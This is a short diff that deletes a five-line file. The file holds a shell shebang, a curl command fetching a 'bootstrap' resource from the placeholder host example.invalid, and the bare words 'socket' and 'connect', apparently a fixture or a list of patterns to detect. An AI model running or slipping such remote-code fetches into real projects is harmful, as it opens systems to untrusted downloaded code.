@@ -1,5 +1,0 @@
-#!/bin/sh
-/bin/sh
-curl http://example.invalid/bootstrap
-socket
-connect
